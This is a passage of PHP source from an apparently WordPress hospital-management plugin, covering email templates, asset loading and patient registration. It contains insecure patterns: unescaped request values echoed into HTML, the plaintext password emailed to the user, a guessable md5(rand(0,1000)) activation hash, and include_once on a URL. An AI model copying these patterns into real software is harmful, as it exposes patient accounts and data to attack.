								  'MJ_hmgt_edit_appointment_doctor_subject'=>'Your appointments have been rescheduled with Patient {{Patient Name}} for {{Appointment Date}} by {{Appointment Date}}.',
					       'MJ_hmgt_edit_appointment_doctor_mail'=>'Dear {{Doctor Name}},

Your appointments has been rescheduled with Patient {{Patient Name}}.  

The new appointment is scheduled for {{Appointment Date}} by {{Appointment Time}}.
     
Regards                                                                                                                                                                                                                          
{{Hospital Name}} .',

								  'MJ_hmgt_edit_appointment_patient_subject'=>'Your appointments has been reschedule with Doctor {{Doctor Name}} for {{Appointment Date}} by {{Appointment Date}}.',
					       'MJ_hmgt_edit_appointment_patient_mail'=>'Dear {{Patient Name}} ,,

Your appointments has been rescheduled with Doctor {{Doctor Name}}.  

Your new appointment is scheduled for {{Appointment Date}} by {{Appointment Time}}.

Regards                                                                                                                                                                                                                          
{{Hospital Name}} .'
		
		);
		return $options;
}
//option add into database
add_action('admin_init','MJ_hmgt_general_setting');	
function MJ_hmgt_general_setting()
{
	$options=MJ_hmgt_option();
	foreach($options as $key=>$val)
	{
		add_option($key,$val); 
		
	}
}
//call script into the page //
function MJ_hmgt_call_script_page()
{
	$page_array = array('hmgt_hospital','hmgt_doctor','hmgt_patient','hmgt_outpatient','hmgt_nurse','hmgt_receptionist','hmgt_pharmacist','hmgt_laboratorist','hmgt_accountant',
					'hmgt_medicine','hmgt_treatment','hmgt_prescription','hmgt_operation','hmgt_diagnosis','hmgt_bloodbank','hmgt_bedmanage','hmgt_bedallotment','hmgt_appointment',
					'hmgt_invoice','hmgt_event','hmgt_message','hmgt_ambulance','hmgt_gnrl_settings','hmgt_report','hmgt_sms_setting','hmgt_audit_log','hmgt_mail_template','hmgt_access_right','hmgt_instrument_mgt','hmgt_setup');
	return  $page_array;
}
//call adminbar css ..
function MJ_hmgt_change_adminbar_css($hook) 
{	
		$current_page = $_REQUEST['page'];
		$page_array = MJ_hmgt_call_script_page();
		if(in_array($current_page,$page_array))
		{			
				wp_register_script( 'jquery-1.8.2', plugins_url( '/assets/js/jquery-1.11.1.min.js', __FILE__), array( 'jquery' ) );
			 	wp_enqueue_script( 'jquery-1.8.2' );		
				wp_enqueue_style( 'accordian-jquery-ui-css', plugins_url( '/assets/accordian/jquery-ui.css', __FILE__) );		
				wp_enqueue_script('accordian-jquery-ui', plugins_url( '/assets/accordian/jquery-ui.js',__FILE__ ));
				
				wp_enqueue_script('bootstrap-select', plugins_url( '/assets/js/bootstrap-select.js',__FILE__ ));
							
				wp_enqueue_style( 'sweetalert', plugins_url( '/assets/css/sweetalert.css', __FILE__) );
				wp_enqueue_style( 'example', plugins_url( '/assets/css/example.css', __FILE__) );
				
				wp_enqueue_style( 'hmgt-calender-css', plugins_url( '/assets/css/fullcalendar.css', __FILE__) );
				wp_enqueue_style( 'hmgt-datatable-css', plugins_url( '/assets/css/dataTables.css', __FILE__) );
				wp_enqueue_style( 'hmgt-dataTables.responsive-css', plugins_url( '/assets/css/dataTables.responsive.css', __FILE__) );
				wp_enqueue_style( 'hmgt-admin-style-css', plugins_url( '/admin/css/admin-style.css', __FILE__) );
				wp_enqueue_style( 'hmgt-style-css', plugins_url( '/assets/css/style.css', __FILE__) );
				wp_enqueue_style( 'hmgt-popup-css', plugins_url( '/assets/css/popup.css', __FILE__) );
				wp_enqueue_style( 'hmgt-custom-css', plugins_url( '/assets/css/custom.css', __FILE__) );
				
				wp_enqueue_script('sweetalert-dev', plugins_url( '/assets/js/sweetalert-dev.js', __FILE__ ), array( 'jquery' ), '4.1.1', true );
				wp_enqueue_script('hmgt-calender_moment', plugins_url( '/assets/js/moment.min.js', __FILE__ ), array( 'jquery' ), '4.1.1', true );
				wp_enqueue_script('hmgt-calender', plugins_url( '/assets/js/fullcalendar.min.js', __FILE__ ), array( 'jquery' ), '4.1.1', true );
				wp_enqueue_script('hmgt-datatable', plugins_url( '/assets/js/jquery.dataTables.min.js',__FILE__ ), array( 'jquery' ), '4.1.1', true);
				wp_enqueue_script('hmgt-datatable-tools', plugins_url( '/assets/js/dataTables.tableTools.min.js',__FILE__ ), array( 'jquery' ), '4.1.1', true);
				wp_enqueue_script('hmgt-datatable-editor', plugins_url( '/assets/js/dataTables.editor.min.js',__FILE__ ), array( 'jquery' ), '4.1.1', true);	
				wp_enqueue_script('hmgt-dataTables.responsive-js', plugins_url( '/assets/js/dataTables.responsive.js',__FILE__ ), array( 'jquery' ), '4.1.1', true);	
				wp_enqueue_script('hmgt-customjs', plugins_url( '/assets/js/hmgt_custom.js', __FILE__ ), array( 'jquery' ), '4.1.1', true );
				wp_enqueue_script('hmgt-timeago-js', plugins_url( '/assets/js/jquery.timeago.js', __FILE__ ) );
				
				wp_enqueue_style( 'hmgt-sweetalert-css', plugins_url( '/assets/css/sweetalert.css', __FILE__) );
				
				wp_enqueue_style( 'hmgt-select2-css', plugins_url( '/lib/select2-3.5.3/select2.css', __FILE__) );
				
				wp_enqueue_script('hmgt-select2', plugins_url( '/lib/select2-3.5.3/select2.min.js', __FILE__ ), array( 'jquery' ), '4.1.1', true);
			
				wp_enqueue_script('hmgt-popup', plugins_url( '/assets/js/popup.js', __FILE__ ), array( 'jquery' ), '4.1.1', true );
				
				//popup file alert msg languages translation				
				wp_localize_script('hmgt-popup', 'language_translate', array(
						'add_note_alert' => __( 'Please enter a note.', 'hospital_mgt' ),
						'medicine_stock_out_alert' => __( 'Medicine Out Of Stock', 'hospital_mgt' ),
						'unique_medicine_alert' => __( 'Please Enter Unique Medicine Name', 'hospital_mgt' ),
						'unique_medicine_id__alert' => __( 'Please Enter Unique Medicine ID', 'hospital_mgt' ),
						'phocode_alert' => __( 'Please Enter Only + and 0-9', 'hospital_mgt' ),
						'delete_record_alert' => __( 'Are you sure want to delete this record?', 'hospital_mgt' ),
						'edit_record_alert' => __( 'Are you sure want to edit this record?', 'hospital_mgt' ),
						'select_multiselect_tax' => __( 'Select Tax', 'hospital_mgt' ),
						'select_all_multiselect' => __( 'Select all', 'hospital_mgt' ),
						'time_validation_alert' => __( 'End Time Must Be Greater Than The Start Time', 'hospital_mgt' )
					)
				);			
				
				//add page in ajax that use localize ajax page
				wp_localize_script( 'hmgt-popup', 'hmgt', array( 'ajax' => admin_url( 'admin-ajax.php' ) ) );
			 	wp_enqueue_script('jquery');
			 	wp_enqueue_media();
		       	wp_enqueue_script('thickbox');
		       	wp_enqueue_style('thickbox');
		 
		      
			 	wp_enqueue_script('hmgt-image-upload', plugins_url( '/assets/js/image-upload.js', __FILE__ ), array( 'jquery' ), '4.1.1', true );
			 
				//image upload file alert msg languages translation				
				wp_localize_script('hmgt-image-upload', 'language_translate1', array(
						'allow_file_alert' => __( 'Only jpg,jpeg,png File allowed', 'hospital_mgt' )						
					)
				);
				
				wp_enqueue_style( 'hmgt-bootstrap-css', plugins_url( '/assets/css/bootstrap.min.css', __FILE__) );
				
				wp_enqueue_style( 'bootstrap-select', plugins_url( '/assets/css/bootstrap-select.css', __FILE__) );
				wp_enqueue_style( 'hmgt-bootstrap-css', plugins_url( '/assets/css/bootstrap.min.css', __FILE__) );
				wp_enqueue_style( 'hmgt-bootstrap-multiselect-css', plugins_url( '/assets/css/bootstrap-multiselect.css', __FILE__) );
				
                 wp_enqueue_style( 'hmgt-bootstrap-timepicker-css', plugins_url( '/assets/css/datepicker.min.css', __FILE__) );

			 	wp_enqueue_style( 'hmgt-font-awesome-css', plugins_url( '/assets/css/font-awesome.min.css', __FILE__) );
			 	wp_enqueue_style( 'hmgt-white-css', plugins_url( '/assets/css/white.css', __FILE__) );
			 	wp_enqueue_style( 'hmgt-time-css', plugins_url( '/assets/css/time.css', __FILE__) );
				
			 	wp_enqueue_style( 'hmgt-hospitalmgt-min-css', plugins_url( '/assets/css/hospitalmgt.min.css', __FILE__) );
				 if (is_rtl())
				 {
					wp_enqueue_style( 'hmgt-bootstrap-rtl-css', plugins_url( '/assets/css/bootstrap-rtl.min.css', __FILE__) );
					wp_enqueue_script('hmgt-validationEngine-en-js', plugins_url( '/assets/js/jquery.validationEngine-en.js', __FILE__ ) );
				 }
				 wp_enqueue_style( 'hmgt-hospitalmgt-responsive-css', plugins_url( '/assets/css/hospital-responsive.css', __FILE__) );
			  
			 	wp_enqueue_script('hmgt-bootstrap-js', plugins_url( '/assets/js/bootstrap.min.js', __FILE__ ) );
			 	wp_enqueue_script('hmgt-bootstrap-multiselect-js', plugins_url( '/assets/js/bootstrap-multiselect.js', __FILE__ ) );
			 	
				    wp_enqueue_script('hmgt-bootstrap-timepicker-js', plugins_url( '/assets/js/bootstrap-datepicker.js', __FILE__ ) );
				    wp_enqueue_script('hmgt-time-js', plugins_url( '/assets/js/time.js', __FILE__ ) );
			 	wp_enqueue_script('hmgt-hospital-js', plugins_url( '/assets/js/hospitaljs.js', __FILE__ ) );
				wp_enqueue_script('hmgt-sweetalert-dev-js', plugins_url( '/assets/js/sweetalert-dev.js', __FILE__ ) );
			 	
				$lancode=get_locale();
				$code=substr($lancode,0,2);
				wp_enqueue_script('hmgt-calender-'.$code.'', plugins_url( '/assets/js/calendar-lang/'.$code.'.js', __FILE__ ), array( 'jquery' ), '4.1.1', true );				
				
			 	//Validation style And Script
			 	
			 	//validation lib
		$lancode=get_locale();
		$code=substr($lancode,0,2);		
		wp_enqueue_style( 'wcwm-validate-css', plugins_url( '/lib/validationEngine/css/validationEngine.jquery.css', __FILE__) );	
		
		
		wp_register_script( 'jquery-validationEngine-'.$code, plugins_url( '/lib/validationEngine/js/languages/jquery.validationEngine-'.$code.'.js', __FILE__), array( 'jquery' ) );
		
		wp_enqueue_script( 'jquery-validationEngine-'.$code );
		
		wp_register_script( 'jquery-validationEngine', plugins_url( '/lib/validationEngine/js/jquery.validationEngine.js', __FILE__), array( 'jquery' ) );
		
		wp_enqueue_script( 'jquery-validationEngine' );
			 
			 if(isset($_REQUEST['page']) && ($_REQUEST['page'] == 'report' || $_REQUEST['page'] == 'hospital'))
			 {
				wp_enqueue_script('hmgt-customjs', plugins_url( '/assets/js/Chart.min.js', __FILE__ ), array( 'jquery' ), '4.1.1', true );
			 }
		}		
	}
	if(isset($_REQUEST['page']))
		add_action( 'admin_enqueue_scripts', 'MJ_hmgt_change_adminbar_css' );		
	
}
//add footer js
add_action('wp_footer', 'MJ_hmgt_footer_js');
function MJ_hmgt_footer_js()
{
	?>
	<script type='text/javascript'>
	<?php 
	  $locale_code = strtolower(str_replace('_','-', get_locale()));
	  $file_short = plugins_url().'/assets/js/lang/'.substr ( $locale_code, 0, 2 ).'.js';
	  include_once($file_short);
	?>
	</script>
	<?php
}
//install login page plug in activate time //
function MJ_hmgt_install_login_page() {

	if ( !get_option('hmgt_login_page') ) {
		
		$curr_page = array(
				'post_title' => __('Hospital Management Login Page', 'hospital_mgt'),
				'post_content' => '[hmgt_login]',
				'post_status' => 'publish',
				'post_type' => 'page',
				'comment_status' => 'closed',
				'ping_status' => 'closed',
				'post_category' => array(1),
				'post_parent' => 0 );
		

		$curr_created = wp_insert_post( $curr_page );

		update_option( 'hmgt_login_page', $curr_created );
	}
}
//install time add patient registration form //
function MJ_hmgt_install_patient_registration_page() 
{
	if ( !get_option('hmgt_patient_registration_page') ) 
	{	

		$curr_page = array(
				'post_title' => __('Hospital Management Patient Registration Page', 'hospital_mgt'),
				'post_content' => '[hmgt_patient_registration]',
				'post_status' => 'publish',
				'post_type' => 'page',
				'comment_status' => 'closed',
				'ping_status' => 'closed',
				'post_category' => array(1),
				'post_parent' => 0 );
		

		$curr_created = wp_insert_post( $curr_page );

		update_option( 'hmgt_patient_registration_page', $curr_created );
		
		
	}
}
//user fronted dashboard  //
function MJ_hmgt_user_dashboard()
{
	if(isset($_REQUEST['dashboard']))
	{
		
		require_once HMS_PLUGIN_DIR. '/fronted_template.php';
		exit;
	}
}
//remove all theme style //
function MJ_hmgt_remove_all_theme_styles()
{
	global $wp_styles;
	$wp_styles->queue = array();
}

if(isset($_REQUEST['dashboard']) && $_REQUEST['dashboard'] == 'user')
{
	add_action('wp_print_styles', 'MJ_hmgt_remove_all_theme_styles', 100);
}
//load script fronted
function MJ_hmgt_load_script1()
{
	if(isset($_REQUEST['dashboard']) && $_REQUEST['dashboard'] == 'user')
	{	
		wp_register_script('hmgt-popup-front', plugins_url( 'assets/js/popup.js', __FILE__ ), array( 'jquery' ));
		//popup file alert msg languages translation				
		wp_localize_script('hmgt-popup-front', 'language_translate', array(
				'add_note_alert' => __( 'Please enter a note.', 'hospital_mgt' ),
				'medicine_stock_out_alert' => __( 'Medicine Out Of Stock', 'hospital_mgt' ),
				'unique_medicine_alert' => __( 'Please Enter Unique Medicine Name', 'hospital_mgt' ),
				'unique_medicine_id__alert' => __( 'Please Enter Unique Medicine ID', 'hospital_mgt' ),
				'phocode_alert' => __( 'Please Enter Only + and 0-9', 'hospital_mgt' ),
				'delete_record_alert' => __( 'Are you sure want to delete this record?', 'hospital_mgt' ),
				'edit_record_alert' => __( 'Are you sure want to edit this record?', 'hospital_mgt' ),
				'select_multiselect_tax' => __( 'Select Tax', 'hospital_mgt' ),
				'select_all_multiselect' => __( 'Select all', 'hospital_mgt' ),
				'time_validation_alert' => __( 'End Time Must Be Greater Than The Start Time', 'hospital_mgt' )
			)
		);			
		wp_enqueue_script('hmgt-popup-front');
		
		wp_localize_script( 'hmgt-popup-front', 'hmgt', array( 'ajax' => admin_url( 'admin-ajax.php' ) ) );
		 wp_enqueue_script('jquery');	
	}
}
//load text domain //
function MJ_hmgt_domain_load()
{
	load_plugin_textdomain( 'hospital_mgt', false, dirname( plugin_basename( __FILE__ ) ). '/languages/' );
}
//Patient registration function//
function MJ_hmgt_registration_validation($patient_id,$first_name,$middle_name,$last_name,$gender,$birth_date,$blood_group,
		$symptoms,$diagnosis,$doctor,$address,$city_name,$state_name,$country_name,$zip_code,$phonecode,$mobile,$phone,$email,
	$username,$password,$hmgt_user_avatar)  
{
	global $reg_errors;
	$reg_errors = new WP_Error;
	if ( empty( $patient_id )  || empty( $first_name ) || empty( $last_name ) || empty( $birth_date ) ||  
	empty( $blood_group ) ||  empty( $symptoms ) || empty( $address ) || empty( $city_name ) || empty( $zip_code ) || 
	empty( $phonecode ) || 	empty( $mobile ) ||	empty( $email ) || empty( $username ) || 	empty( $password )	) 
	{
		$reg_errors->add('field', 'Required form field is missing');
	}
	if ( 4 > strlen( $username ) ) {
    $reg_errors->add( 'username_length', 'Username too short. At least 4 characters is required' );
	}
	if ( username_exists( $username ) )
		$reg_errors->add('user_name', 'Sorry, that username already exists!');
	if ( ! validate_username( $username ) ) {
    $reg_errors->add( 'username_invalid', 'Sorry, the username you entered is not valid' );
	}
	
	if ( !is_email( $email ) ) {
    $reg_errors->add( 'email_invalid', 'Email is not valid' );
	}
	if ( email_exists( $email ) ) {
    $reg_errors->add( 'email', 'Email Already in use' );
	}
	if(!empty($diagnosis))
	{	
		//multiple diagnosis insert //
		$upload_dignosis_array=array();
	
		if(!empty($diagnosis['name']))
		{
			$count_array=count($diagnosis['name']);

			for($a=0;$a<$count_array;$a++)
			{			
				foreach($diagnosis as $image_key=>$image_val)
				{	
					if($diagnosis['name'][$a]!='')
					{	
						$diagnosis_array[$a]=array(
						'name'=>$diagnosis['name'][$a],
						'type'=>$diagnosis['type'][$a],
						'tmp_name'=>$diagnosis['tmp_name'][$a],
						'error'=>$diagnosis['error'][$a],
						'size'=>$diagnosis['size'][$a]
						);							
					}	
				}
			}
			if(!empty($diagnosis_array))
			{	
				foreach($diagnosis_array as $key=>$value)		
				{	
					$get_file_name=$diagnosis_array[$key]['name'];					
						
					$upload_dignosis_array[] = $get_file_name;
				} 
			}	
		}
		$diagnosis_report_url=$upload_dignosis_array;
		
		$ext1=MJ_hmgt_check_valid_file_extension_for_diagnosis($diagnosis_report_url);
		
		if($ext1 != 0 )
		{
			$reg_errors->add( 'Dignosis', 'Sorry, only JPG,JPEG,PNG,GIF,DOC,PDF and ZIP files are allowed.' );
		}	
	} 
	
	if ( is_wp_error( $reg_errors ) ) {
    foreach ( $reg_errors->get_error_messages() as $error ) 
	{
        echo '<div class="student_reg_error">';
        echo '<strong>ERROR</strong> : ';
        echo '<span class="error"> '.$error . ' </span><br/>';
        echo '</div>';
    }
}	
}
//patient registration completed //
function MJ_hmgt_complete_registration($patient_id,$first_name,$middle_name,$last_name,$gender,$birth_date,$blood_group,$symptoms,$diagnosis,$doctor,$address,$city_name,$state_name,$country_name,$zip_code,$phonecode,$mobile,$phone,$email,$username,$password,$hmgt_user_avatar) 
{
    global $reg_errors;
	 global $patient_id,$first_name,$middle_name,$last_name,$gender,$birth_date,$blood_group,$symptoms,$diagnosis,
	$doctor,$address,$city_name,$state_name,$country_name,$zip_code,$phonecode,$mobile,$phone,$email,
	$username,$password,$hmgt_user_avatar;
	 $smgt_avatar = '';	
		
    if ( 1 > count( $reg_errors->get_error_messages() ) ) {
        $userdata = array(
        'user_login'    =>   $username,
        'user_email'    =>   $email,
        'user_pass'     =>   $password,
        'user_url'      =>   NULL,
        'first_name'    =>   $first_name,
        'last_name'     =>   $last_name,
        'nickname'      =>   NULL
        
        );
		$diagnosis_report = '';
		$user_object=new MJ_hmgt_user();
		$user_id = wp_insert_user( $userdata );
		$id=0;
		
		$guardian_data=array('patient_id'=>$user_id,
							'doctor_id'=>$doctor,
							'symptoms'=>$symptoms,
							'inpatient_create_date'=>date("Y-m-d H:i:s"),'inpatient_create_by'=>1
					);
					$inserted=MJ_hmgt_add_guardian($guardian_data,$id);
		
			//multiple diagnosis insert //
			$upload_dignosis_array=array();
		
			if(!empty($_FILES['diagnosis']['name']))
			{
				$count_array=count($_FILES['diagnosis']['name']);

				for($a=0;$a<$count_array;$a++)
				{			
					foreach($_FILES['diagnosis'] as $image_key=>$image_val)
					{	
						if($_FILES['diagnosis']['name'][$a]!='')
						{	
							$diagnosis_array[$a]=array(
							'name'=>$_FILES['diagnosis']['name'][$a],
							'type'=>$_FILES['diagnosis']['type'][$a],
							'tmp_name'=>$_FILES['diagnosis']['tmp_name'][$a],
							'error'=>$_FILES['diagnosis']['error'][$a],
							'size'=>$_FILES['diagnosis']['size'][$a]
							);							
						}	
					}
				}
				if(!empty($diagnosis_array))
				{
					foreach($diagnosis_array as $key=>$value)		
					{	
						$get_file_name=$diagnosis_array[$key]['name'];	
						
						$upload_dignosis_array[]=MJ_hmgt_load_multiple_documets($value,$value,$get_file_name);				
					} 				
				}	
			}		
			
			$user_object->upload_multiple_diagnosis_report($user_id,$upload_dignosis_array);
				
		
		 $patient_image_url = '';
	  if($_FILES['hmgt_user_avatar']['size'] > 0)
						{
						 $patient_image=MJ_hmgt_load_documets($_FILES['hmgt_user_avatar'],'hmgt_user_avatar','pimg');
						$patient_image_url=content_url().'/uploads/hospital_assets/'.$patient_image;
						}
 		$user = new WP_User($user_id);
	  $user->set_role('patient');
	
		$usermetadata=array('patient_id' => $patient_id,						
						'middle_name'=>$middle_name,
						'gender'=>$gender,
						'birth_date'=>$birth_date,
						'address'=>$address,
						'city_name'=>$city_name,
						'state_name'=>$state_name,
						'country_name'=>$country_name,
						'zip_code'=>$zip_code,						
						'phone'=>$phone,
						'phonecode'=>$phonecode,
						'mobile'=>$mobile,
						'blood_group'=>$blood_group,
						'symptoms'=>$symptoms,
						'patient_type' => $_POST['patient_type'],
						
						'hmgt_user_avatar'=>$patient_image_url);
		
		
							foreach($usermetadata as $key=>$val)
							{		
							update_user_meta( $user_id, $key,$val );	
						
							}
							$returnans=update_user_meta( $user_id, 'first_name',$first_name );
							$returnans=update_user_meta( $user_id, 'last_name',$last_name );
							$hash = md5( rand(0,1000) );
					update_user_meta( $user_id, 'hmgt_hash', $hash );

					$user_info = get_userdata($user_id);
					$to = $user_info->user_email;           
					$subject = 'Patient Verification'; 
					$message = 'Hello,';
					$message .= "\n\n";
					$message .= 'Welcome...';
					$message .= "\n\n";
					$message .= 'User name: '.$username;
					$message .= "\n";
					$message .= 'Password: '.$password;
					$message .= "\n\n";
					$message .= 'Please click this url or copy this url and past into address bar to activate your account : ';
					$message .= "\n";
					$message .= home_url('/').'?id='.$username.'&haskey='.$hash;

					wp_mail($to, $subject, $message); 
							echo 'Registration complete.Your account active after Once you confirm your email.';   
	}
}
function MJ_hmgt_registration_form($patient_id,$first_name,$middle_name,$last_name,$gender,$birth_date,$blood_group,$symptoms,$diagnosis,$doctor,$address,$city_name,$state_name,$country_name,$zip_code,$phonecode,$mobile,$phone,$email,$username,$password,$hmgt_user_avatar) 
{
	$edit = 0;
	$role='patient';
	$patient_type='outpatient';
	$lastpatient_id=MJ_hmgt_get_lastpatient_id($role);
	$nodate=substr($lastpatient_id,0,-4);
	$patientno=substr($nodate,1);
	$patientno+=1;
	$newpatient='P'.$patientno.date("my");
		echo '
		<style>
		.patient_registraion_form {
	  float: left;
	  width: 100%;
	}
	.patient_registraion_form .form-group {
	  margin-bottom: 10px;
	  margin-top: 10px;
	}
	.patient_registraion_form .form-group .form-control {
	  font-size: 16px;
	}
		.patient_registraion_form .form-group,.patient_registraion_form .form-group .form-control{float:left;width:100%}
		.patient_registraion_form .form-group .require-field{color:red;}
		.patient_registraion_form select.form-control,.patient_registraion_form input[type="file"] {
	  padding: 0.5278em;
	   margin-bottom: 5px;
	}
	.patient_registraion_form  .radio-inline {
		float: left;
		margin-bottom: 10px;
		margin-top: 10px;
		 margin-right: 15px;
	}
	.patient_registraion_form  .radio-inline .tog {
		margin-right: 5px;
	}
	.patient_registraion_form .col-sm-2.control-label {
	  line-height: 48px;
	  text-align: right;
	}
		.patient_registraion_form .form-group .col-sm-2 {width: 24.667%;}
		.patient_registraion_form .form-group .col-sm-8 {     width: 66.66666667%;}
		.patient_registraion_form .form-group .col-sm-7{  width: 53.33333333%;}
		.patient_registraion_form .form-group .col-sm-1{  width: 13.33333333%;}
		.patient_registraion_form .form-group .col-sm-8, .patient_registraion_form .form-group .col-sm-2,.patient_registraion_form .form-group .col-sm-7,.patient_registraion_form .form-group .col-sm-1{      
		padding-left: 15px;
		 padding-right: 15px;
		float:left;}
		.patient_registraion_form .form-group .col-sm-8, .patient_registraion_form .form-group .col-sm-2,.patient_registraion_form .form-group .col-sm-7{
			position: relative;
		min-height: 1px;   
		}

		div {
			margin-bottom:2px;
		}
		 
		input{
			margin-bottom:4px;
		}
		.patient_registraion_form .col-sm-offset-2.col-sm-8 {
	  float: left;
	  margin-left: 35%;
	  margin-top: 15px;
	}
	.patient_registraion_form .form-control {
	  line-height: 30px;
	}
		.student_reg_error .error{color:red;}
		</style>
		';
 
		echo '
		<div class="patient_registraion_form">
		<form action="' . $_SERVER['REQUEST_URI'] . '" method="post" id="registration_form" enctype="multipart/form-data">';
		wp_enqueue_script('gmgt-defaultscript', plugins_url( '/assets/js/jquery-1.11.1.min.js', __FILE__ ), array( 'jquery' ), '4.1.1', true );
		$lancode=get_locale();
		$code=substr($lancode,0,2);		
		wp_enqueue_style( 'wcwm-validate-css', plugins_url( '/lib/validationEngine/css/validationEngine.jquery.css', __FILE__) );	
		
		
		wp_register_script( 'jquery-validationEngine-'.$code, plugins_url( '/lib/validationEngine/js/languages/jquery.validationEngine-'.$code.'.js', __FILE__), array( 'jquery' ) );
		
		wp_enqueue_script( 'jquery-validationEngine-'.$code );
		
		wp_register_script( 'jquery-validationEngine', plugins_url( '/lib/validationEngine/js/jquery.validationEngine.js', __FILE__), array( 'jquery' ) );
		
		wp_enqueue_script( 'jquery-validationEngine' );
		wp_enqueue_style( 'hmgt-bootstrap-timepicker-css', plugins_url( '/assets/css/datepicker.min.css', __FILE__) );
		wp_enqueue_script('hmgt-bootstrap-timepicker-js', plugins_url( '/assets/js/bootstrap-datepicker.js', __FILE__ ) );
		//wp_enqueue_script('jquery-ui-datepicker');
		wp_enqueue_style('jquery-style', 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.2/themes/smoothness/jquery-ui.css');
			?>
		<script type="text/javascript"	src="<?php echo HMS_PLUGIN_URL.'/assets/js/jquery-1.11.1.min.js'; ?>"></script>	
		<link rel="stylesheet"	type = "text/css" href="<?php echo HMS_PLUGIN_URL.'/lib/validationEngine/css/validationEngine.jquery.css'; ?>"/>		
		<link rel="stylesheet"	type = "text/css" href="<?php echo HMS_PLUGIN_URL.'/assets/css/datepicker.min.css'; ?>"/>		
		<?php $lancode=get_locale();
		$code=substr($lancode,0,2);	
		?>
		<script type="text/javascript"	src="<?php echo HMS_PLUGIN_URL.'/lib/validationEngine/js/languages/jquery.validationEngine-'.$code.'.js'; ?>"></script>		
		<script type="text/javascript"	src="<?php echo HMS_PLUGIN_URL.'/lib/validationEngine/js/jquery.validationEngine.js'; ?>"></script>
		<script type="text/javascript"	src="<?php echo HMS_PLUGIN_URL.'/assets/js/bootstrap-datepicker.js'; ?>"></script>
		<script type="text/javascript">
		jQuery(document).ready(function(){
		 $('#registration_form').validationEngine({promptPosition : "bottomRight",maxErrorsPerField: 1});

			  $.fn.datepicker.defaults.format ="<?php  echo MJ_hmgt_dateformat_PHP_to_jQueryUI(MJ_hmgt_date_formate()); ?>";
			  $('.birth_date').datepicker({
				endDate: '+0d',
				autoclose: true
				 
		   }); 
		 /*    $('#symptoms').multiselect({
				nonSelectedText :'<?php _e('Select Symptoms','hospital_mgt'); ?>',
				includeSelectAllOption: true,
				selectAllText : '<?php _e('Select all','hospital_mgt'); ?>'
			 }); */
			 $("body").on("click", ".add_more_report", function()
			{
				$(".diagnosissnosis_div").append('<div class="form-group"><label class="col-sm-2 control-label" for="diagnosis"><?php _e('Diagnosis Report','hospital_mgt');?></label><div class="col-sm-8"><input type="file" class="dignosisreport form-control file" name="diagnosis[]"></div><div class="col-sm-2"><input type="button" value="<?php _e('Delete','hospital_mgt') ?>" onclick="deleteParentElement(this)" class="remove_cirtificate btn btn-default"></div></div>');
			});				
			$("body").on("click", ".remove_cirtificate", function()
			{
				alert("<?php _e('Do you really want to delete this record ?','hospital_mgt');?>");
				$(this).parent().parent().remove();
			});
		} );
		</script>
	  <?php $action = isset($_REQUEST['action'])?$_REQUEST['action']:'insert';?>
		<input type="hidden" name="action" value="<?php echo $action;?>" />
		<input type="hidden" name="role" value="<?php echo $role;?>"  />
		<input type="hidden" name="patient_type" value="<?php echo $patient_type;?>" />
		
		<input type="hidden" name="user_id" value="<?php if(isset($_REQUEST['outpatient_id'])) echo $_REQUEST['outpatient_id'];?>"  />
		<input id="patient_id" type="hidden" value="<?php  echo $newpatient;?>" name="patient_id" />
		
		<div class="form-group">
			<label class="col-sm-2 control-label" for="first_name"><?php _e('First Name','hospital_mgt');?><span class="require-field">*</span></label>
			<div class="col-sm-8">
				<input id="first_name" class="form-control validate[required,custom[onlyLetter_specialcharacter]] text-input" maxlength="50" type="text" value="<?php if($edit){ echo $user_info->first_name;}elseif(isset($_POST['first_name'])) echo $_POST['first_name'];?>" name="first_name">
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-2 control-label" for="middle_name"><?php _e('Middle Name','hospital_mgt');?></label>
			<div class="col-sm-8">
				<input id="middle_name" class="form-control validate[custom[onlyLetter_specialcharacter]]" maxlength="50" type="text"  value="<?php if($edit){ echo $user_info->middle_name;}elseif(isset($_POST['middle_name'])) echo $_POST['middle_name'];?>" name="middle_name">
			</div>
		</div>
		<div class="form-group">
			<label class="col-sm-2 control-label" for="last_name"><?php _e('Last Name','hospital_mgt');?><span class="require-field">*</span></label>
			<div class="col-sm-8">
				<input id="last_name" class="form-control validate[required,custom[onlyLetter_specialcharacter]] text-input" maxlength="50" type="text"  value="<?php if($edit){ echo $user_info->last_name;}elseif(isset($_POST['last_name'])) echo $_POST['last_name'];?>" name="last_name">
			</div>
		</div>
		
		<div class="form-group">
			<label class="col-sm-2 control-label" for="gender"><?php _e('Gender','hospital_mgt');?><span class="require-field">*</span></label>
			<div class="col-sm-8">
			<?php $genderval = "male"; if($edit){ $genderval=$user_info->gender; }elseif(isset($_POST['gender'])) {$genderval=$_POST['gender'];}?>
				<label class="radio-inline">
			     <input type="radio" value="male" class="tog validate[required]" name="gender"  <?php  checked( 'male', $genderval);  ?>/><?php _e('Male','hospital_mgt');?>
			    </label>
			    <label class="radio-inline">
			      <input type="radio" value="female" class="tog validate[required]" name="gender"  <?php  checked( 'female', $genderval);  ?>/><?php _e('Female','hospital_mgt');?> 
			    </label>
			</div>
		</div>
		
		<div class="form-group">
			<label class="col-sm-2 control-label" for="birth_date"><?php _e('Date of birth','hospital_mgt');?><span class="require-field">*</span></label>
			<div class="col-sm-8">
				<input id="birth_date" class="form-control validate[required] birth_date" type="text"  name="birth_date"
				value="<?php if($edit){ echo $user_info->birth_date;}elseif(isset($_POST['birth_date'])) echo $_POST['birth_date'];?>" readonly>
			</div>
		</div>		
		<div class="form-group">
			<label class="col-sm-2 control-label" for="blood_group"><?php _e('Blood Group','hospital_mgt');?><span class="require-field">*</span></label>
			<div class="col-sm-8">
				<?php if($edit){ $userblood=$user_info->blood_group; }elseif(isset($_POST['blood_group'])){$userblood=$_POST['blood_group'];}else{$userblood='';}?>
				<select id="blood_group" class="form-control validate[required]" name="blood_group">
				<option value=""><?php _e('Select Blood Group','hospital_mgt');?></option>
				<?php foreach(MJ_hmgt_blood_group() as $blood){ ?>
						<option value="<?php echo $blood;?>" <?php selected($userblood,$blood);  ?>><?php echo $blood; ?> </option>
				<?php } ?>
			</select>
			</div>
		</div>
		<?php if(isset($_REQUEST['action']) && $_REQUEST['action'] == 'edit'){?>
		<div class="form-group">
			<label class="col-sm-2 control-label" for="patient_convert"><?php  _e(' Convert into Inpatient','hospital_mgt');?></label>
				<div class="col-sm-8">
				<input type="checkbox"  name="patient_convert" value="inpatient">
				
				</div>
		</div>
		<?php }?>
			<div class="form-group">
